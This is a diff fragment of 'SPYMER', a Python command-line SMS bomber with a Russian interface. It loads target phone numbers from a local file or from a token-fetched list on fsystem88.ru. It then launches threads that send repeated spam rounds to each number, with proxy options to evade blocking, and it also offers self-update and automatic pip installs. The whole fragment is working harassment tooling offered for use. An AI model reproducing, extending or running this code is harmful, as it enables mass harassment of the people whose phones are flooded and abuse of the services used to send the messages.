+				f_name=input(Fore.BLUE+"spymer > "+Style.RESET_ALL+"~/")
+				clear()
+				logo()
+				print(info)
+				try:
+					os.chdir(os.getenv("HOME"))
+					file=open("{}".format(f_name))
+					array=file.read().splitlines()
+					if array[-1] == '':
+						array.pop()
+					print("Файл найден.\nНомера:\n{}".format(array))
+					print('Введите количество кругов ("Enter" - отмена):')
+					count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+					try:
+						if int(count):
+							count=int(count)
+							info = '\nФайл: ~/{}\nКол-во кругов: {}'.format(f_name, count)
+							clear()
+							logo()
+							print(info)
+							for phone in array:
+								make7phone()
+								if proxy=="localhost":
+									proxies=None
+								else:
+									proxies="{'"+ssl+"':'"+proxy+"'}"
+								try:
+									if int(phone):
+										id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
+										if int(id) > 0:
+											print(Fore.RED+"\nНомер телефона {} находится в антиспам листе.".format(phone)+Style.RESET_ALL)
+											exit()
+										elif int(id)==0:
+											print('\nЗапущен спам на {}.Если хочешь остановить - нажмите Ctrl+Z.'.format(phone))
+											thread_list = []
+											t = threading.Thread (target=n_send, args=(phone,count, proxies))
+											thread_list.append(t)
+											t.start()
+								except:
+									print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
+							for th in threading.enumerate(): 
+								if th != threading.currentThread():
+									th.join()	
+					except:
+						info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL
+
+					print(Fore.BLUE+"\nГотово.\nФайл: {}\nКол-во кругов: {}".format(f_name, count)+Style.RESET_ALL)
+					exit()
+				except FileNotFoundError:
+					info=Fore.RED+"\nФайл {} не найден".format(f_name)+Style.RESET_ALL
+
+			def tokensend():
+				global phone
+				global name
+				global password
+				global email
+				global ssl
+				global proxy
+				global info
+				global proxies
+				clear()
+				logo()
+				print(info)
+				print("Введите токен: ")
+				print("Загрузить файл и получить токен можно по ссылке:")
+				print(Fore.GREEN+"https://FSystem88.ru/spymer/\n"+Style.RESET_ALL)
+				token=input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+				id=requests.post('https://fsystem88.ru/spymer/spym.php', data={'token': token}).json()["id"]
+				if int(id) != 0:
+					req=requests.get("https://fsystem88.ru/spymer/token/{}".format(token))
+					file=open(token, "w+")
+					file.write(req.text)
+					file.close()
+					info=""
+					clear()
+					logo()
+					print(info)
+					file=open(token)
+					array=file.read().splitlines()
+					if array[-1] == '':
+						array.pop()
+					file.close()
+					print("Файл скачан успешно.\nТелефоны:\n{}".format(req.text))
+					print('Введите количество кругов ("Enter" - отмена):')
+					count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+					try:
+						if int(count):
+							count=int(count)
+							info = '\nТокен: {}\nКол-во кругов: {}'.format(token, count)
+							clear()
+							logo()
+							print(info)
+							for phone in array:
+								make7phone()
+								if proxy=="localhost":
+									proxies=None
+								else:
+									proxies="{'"+ssl+"':'"+proxy+"'}"
+								try:
+									if int(phone):
+										id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
+										if int(id) > 0:
+											print(Fore.RED+"\nНомер телефона {} находится в антиспам листе.".format(phone)+Style.RESET_ALL)
+											exit()
+										elif int(id)==0:
+											print('\nЗапущен спам на {}.Если хочешь остановить - нажмите Ctrl+Z.'.format(phone))
+											thread_list = []
+											t = threading.Thread (target=n_send, args=(phone,count, proxies))
+											thread_list.append(t)
+											t.start()
+								except:
+									print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
+							for th in threading.enumerate(): 
+								if th != threading.currentThread():
+									th.join()	
+					except:
+						info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL
+
+					print(Fore.BLUE+"\nГотово.\nТокен: {}\nКол-во кругов: {}\n".format(token, count)+Style.RESET_ALL)
+					exit()
+
+			def n_send(phone, count, proxies):
+				global name
+				global password
+				global email
+				global info
+				iteration=0
+				while iteration < count:
+					addparams()
+					sms()
+					iteration+=1
+					print(Fore.GREEN+"{}".format(phone)+Style.RESET_ALL+": круг №{} пройден.".format(iteration))
+				print(Fore.GREEN+"\nСпам на {} закончен. Кол-во кругов {}".format(phone, count)+Style.RESET_ALL)
 				exit()
-	main()
-Main()
+			
+			def main():
+				global phone
+				global info
+				global proxy
+				global ssl
+				global proxies 
+				proxy = "localhost"
+				info = " "
+				while True:
+					clear()
+					logo()
+					print(info)
+					checkver()
+					print("Proxy: "+Fore.BLUE+"{}".format(proxy)+Style.RESET_ALL)
+					print("1) СМС спамер.")
+					print("2) Проверить телефон в антиспам лист.")
+					print("3) Добавить телефон в антиспам листе.")
+					print("4) Обновить прокси.")
+					print("5) Обновить SPYMER.")
+					print("6) Выход.")
+					input1 = input(Fore.BLUE+"Введите номер пункта: "+Style.RESET_ALL)
+					if input1 == "1":
+						clear()
+						logo()
+						print(info)
+						print("Выберите один вариант:")
+						print("1. Запустить спамер на один номер")
+						print("2. Выгрузить номера из TXT файла ")
+						print("3. Выгрузить номера по токену")
+						input11= input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+						if input11 == "1":
+							onesend()
+
+						elif input11 == "2":
+							filesend()
+
+						elif input11 == "3":
+							tokensend()
+						else:
+							print("Некорректно")
+					
+					elif input1 == "2":
+						checkspamlist()
+
+					elif input1 == "3":
+						addantispam()
+					
+					elif input1 == "4":
+						print("1. Удалить прокси")
+						print("2. Ввести свой прокси")
+						print("3. Сгенерировать прокси")
+						input51 = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+						if input51=="1":
+							proxy = "localhost"
+						
+						elif input51=="2":
+							updateproxy()
+
+						elif input51=="3":
+							generateproxy()
+
+					elif input1 == "5":
+						update()
+					
+					elif input1 == "6":
+						print (Fore.BLUE+"\nДо скорой встречи!)\n"+Style.RESET_ALL)
+						exit()
+
+			main()
+		Main()
+		
+	except ModuleNotFoundError:
+		os.system('cls' if os.name=='nt' else 'clear')
+		print("Нажмите Enter чтобы установить недостающие библиотеки...")
+		input()
+		os.system("python -m pip install requests colorama proxyscrape")
+		
+		MAIN()
+MAIN()
